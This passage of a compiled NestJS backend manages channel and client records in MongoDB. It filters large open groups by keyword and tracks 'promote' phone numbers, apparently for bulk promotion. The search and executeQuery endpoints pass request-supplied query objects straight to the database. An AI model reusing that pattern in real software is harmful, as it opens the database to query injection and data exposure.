    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_channel_dto_1.SearchChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all  channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_channel_dto_1.UpdateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "remove", null);
exports.ChannelsController = ChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Channels'),
    (0, common_1.Controller)('channels'),
    __metadata("design:paramtypes", [channels_service_1.ChannelsService])
], ChannelsController);


/***/ }),

/***/ "./src/components/channels/channels.module.ts":
/*!****************************************************!*\
  !*** ./src/components/channels/channels.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const channels_controller_1 = __webpack_require__(/*! ./channels.controller */ "./src/components/channels/channels.controller.ts");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let ChannelsModule = class ChannelsModule {
};
exports.ChannelsModule = ChannelsModule;
exports.ChannelsModule = ChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: channel_schema_1.Channel.name, schema: channel_schema_1.ChannelSchema }]),
        ],
        controllers: [channels_controller_1.ChannelsController],
        providers: [channels_service_1.ChannelsService],
        exports: [channels_service_1.ChannelsService]
    })
], ChannelsModule);


/***/ }),

/***/ "./src/components/channels/channels.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/channels/channels.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let ChannelsService = class ChannelsService {
    constructor(ChannelModel) {
        this.ChannelModel = ChannelModel;
    }
    async create(createChannelDto) {
        const createdChannel = new this.ChannelModel(createChannelDto);
        return createdChannel.save();
    }
    async createMultiple(createChannelDtos) {
        const bulkOps = createChannelDtos.map((dto) => {
            const cleanDto = Object.fromEntries(Object.entries(dto).filter(([_, value]) => value !== undefined));
            return {
                updateOne: {
                    filter: { channelId: dto.channelId },
                    update: {
                        $set: {
                            title: { $ifNull: [dto.title, "$title"] },
                            username: { $ifNull: [dto.username, "$username"] },
                            participantsCount: { $ifNull: [dto.participantsCount, "$participantsCount"] },
                        },
                        $setOnInsert: {
                            channelId: dto.channelId,
                            broadcast: false,
                            canSendMsgs: true,
                            participantsCount: cleanDto.participantsCount,
                            restricted: false,
                            sendMessages: true,
                            reactRestricted: false,
                            wordRestriction: 0,
                            dMRestriction: 0,
                            availableMsgs: [],
                            banned: false,
                            megagroup: cleanDto.megagroup !== undefined ? cleanDto.megagroup : true,
                            private: false,
                        }
                    },
                    upsert: true
                }
            };
        });
        await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });
        return 'Channels Saved';
    }
    async findAll() {
        return this.ChannelModel.find().exec();
    }
    async findOne(channelId) {
        const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();
        return channel;
    }
    async update(channelId, updateChannelDto) {
        const updatedChannel = await this.ChannelModel.findOneAndUpdate({ channelId }, { $set: updateChannelDto }, { new: true, upsert: true }).exec();
        return updatedChannel;
    }
    async remove(channelId) {
        const botsService = (0, utils_1.getBotsServiceInstance)();
        if (botsService) {
            botsService.sendMessageByCategory(bots_1.ChannelCategory.PROM_LOGS2, `Removing Channel: ${channelId}`);
        }
        const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();
    }
    async search(filter) {
        console.log(filter);
        return this.ChannelModel.find(filter).exec();
    }
    async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {
        const pattern = new RegExp(keywords.join('|'), 'i');
        const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i");
        const query = {
            $and: [
                { username: { $ne: null } },
                {
                    $or: [
                        { title: { $regex: pattern } },
                        { username: { $regex: pattern } }
                    ]
                },
                {
                    username: {
                        $not: {
                            $regex: "^(" + notIds.map(id => "(?i)" + id?.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))?.join("|") + ")$"
                        }
                    }
                },
                {
                    title: { $not: { $regex: notPattern } }
                },
                {
                    username: { $not: { $regex: notPattern } }
                },
                {
                    sendMessages: false,
                    broadcast: false,
                    restricted: false
                }
            ]
        };
        const sort = { participantsCount: "desc" };
        try {
            const result = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
    async executeQuery(query, sort, limit) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.ChannelModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getActiveChannels(limit = 50, skip = 0, notIds = []) {
        const query = {
            '$and': [
                {
                    '$and': [
                        {
                            title: {
                                $exists: true,
                                $type: "string",
                                '$not': { '$regex': /online|realestat|propert|freefire|bgmi|promo|agent|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }
                            }
                        },
                        {
                            username: {
                                $exists: true,
                                $type: "string",
                                '$not': { '$regex': /online|freefire|bgmi|promo|agent|realestat|propert|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }
                            }
                        },
                    ]
                },
                {
                    channelId: { '$nin': notIds },
                    participantsCount: { $gt: 1000 },
                    username: { $ne: null },
                    canSendMsgs: true,
                    restricted: false,
                }
            ]
        };
        try {
            const pipeline = [
                { $match: query },
                { $addFields: { randomField: { $rand: {} } } },
                { $sort: { randomField: 1 } },
                { $skip: skip },
                { $limit: limit },
                { $project: { randomField: 0 } }
            ];
            const result = await this.ChannelModel.aggregate(pipeline, { allowDiskUse: true }).exec();
            return result;
        }
        catch (error) {
            console.error(' Aggregation Error:', error);
            return [];
        }
    }
};
exports.ChannelsService = ChannelsService;
exports.ChannelsService = ChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(channel_schema_1.Channel.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ChannelsService);


/***/ }),

/***/ "./src/components/channels/dto/create-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/create-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateChannelDto {
    constructor() {
        this.private = false;
        this.forbidden = false;
    }
}
exports.CreateChannelDto = CreateChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a broadcast channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a megagroup',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Number of participants in the channel',
        example: 0,
    }),
    __metadata("design:type", Number)
], CreateChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is restricted',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel can send messages',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username of the channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        default: false, example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "forbidden", void 0);


/***/ }),

/***/ "./src/components/channels/dto/index.ts":
/*!**********************************************!*\
  !*** ./src/components/channels/dto/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./search-channel.dto */ "./src/components/channels/dto/search-channel.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-channel.dto */ "./src/components/channels/dto/update-channel.dto.ts"), exports);


/***/ }),

/***/ "./src/components/channels/dto/search-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/search-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class SearchChannelDto {
}
exports.SearchChannelDto = SearchChannelDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'privacy of the channel',
        example: false,
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Username of the channel',
        example: 'ayesha_channel',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], SearchChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum number of participants in the channel',
        example: 10,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "minParticipantsCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum number of participants in the channel',
        example: 100,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "maxParticipantsCount", void 0);


/***/ }),

/***/ "./src/components/channels/dto/update-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/update-channel.dto.ts ***!
  \***********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_channel_dto_1 = __webpack_require__(/*! ./create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
class UpdateChannelDto extends (0, swagger_1.PartialType)(create_channel_dto_1.CreateChannelDto) {
}
exports.UpdateChannelDto = UpdateChannelDto;


/***/ }),

/***/ "./src/components/channels/index.ts":
/*!******************************************!*\
  !*** ./src/components/channels/index.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./channels.controller */ "./src/components/channels/channels.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./channels.module */ "./src/components/channels/channels.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/channels/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/channels/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/channels/schemas/channel.schema.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/schemas/channel.schema.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelSchema = exports.Channel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
let Channel = class Channel {
};
exports.Channel = Channel;
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], Channel.prototype, "channelId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "broadcast", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], Channel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], Channel.prototype, "participantsCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "restricted", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "sendMessages", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Channel.prototype, "title", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: null }),
    __metadata("design:type", String)
], Channel.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "private", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "forbidden", void 0);
exports.Channel = Channel = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Channel);
exports.ChannelSchema = mongoose_1.SchemaFactory.createForClass(Channel);


/***/ }),

/***/ "./src/components/channels/schemas/index.ts":
/*!**************************************************!*\
  !*** ./src/components/channels/schemas/index.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./channel.schema */ "./src/components/channels/schemas/channel.schema.ts"), exports);


/***/ }),

/***/ "./src/components/clients/client.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/clients/client.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const create_client_dto_1 = __webpack_require__(/*! ./dto/create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const search_client_dto_1 = __webpack_require__(/*! ./dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
const update_client_dto_1 = __webpack_require__(/*! ./dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
const decorators_1 = __webpack_require__(/*! ../../decorators */ "./src/decorators/index.ts");
const interceptors_1 = __webpack_require__(/*! ../../interceptors */ "./src/interceptors/index.ts");
let ClientController = class ClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return await this.clientService.create(createClientDto);
    }
    async search(query) {
        return await this.clientService.search(query);
    }
    async searchByPromoteMobile(mobile) {
        const result = await this.clientService.enhancedSearch({ promoteMobileNumber: mobile });
        return {
            clients: result.clients,
            matches: result.promoteMobileMatches || [],
            searchedMobile: mobile,
        };
    }
    async enhancedSearch(query) {
        const result = await this.clientService.enhancedSearch(query);
        return {
            clients: result.clients,
            searchType: result.searchType,
            promoteMobileMatches: result.promoteMobileMatches,
            totalResults: result.clients.length,
        };
    }
    async updateClient(clientId) {
        this.clientService.updateClient(clientId);
        return 'Update client initiated';
    }
    async findAllMasked() {
        return await this.clientService.findAllMasked();
    }
    async findOneMasked(clientId) {
        return await this.clientService.findOneMasked(clientId);
    }
    async findAll() {
        return await this.clientService.findAll();
    }
    async findOne(clientId) {
        return await this.clientService.findOne(clientId);
    }
    async update(clientId, updateClientDto) {
        return await this.clientService.update(clientId, updateClientDto);
    }
    async remove(clientId) {
        return await this.clientService.remove(clientId);
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        return await this.clientService.executeQuery(query, sort, limit, skip);
    }
    async addPromoteMobile(clientId, body) {
        return this.clientService.addPromoteMobile(clientId, body.mobileNumber);
    }
    async removePromoteMobile(clientId, body) {
        return await this.clientService.removePromoteMobile(clientId, body.mobileNumber);
    }
};
exports.ClientController = ClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    (0, swagger_1.ApiBody)({ type: create_client_dto_1.CreateClientDto }),
    (0, swagger_1.ApiResponse)({ description: 'The user data has been successfully created.', type: client_schema_1.Client }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Client ID' }),
    (0, swagger_1.ApiQuery)({ name: 'dbcoll', required: false, description: 'Database collection name' }),
    (0, swagger_1.ApiQuery)({ name: 'channelLink', required: false, description: 'Channel link' }),
    (0, swagger_1.ApiQuery)({ name: 'link', required: false, description: 'Client link' }),
    (0, swagger_1.ApiResponse)({ description: 'Matching user data returned successfully.', type: [client_schema_1.Client] }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('search/promote-mobile'),
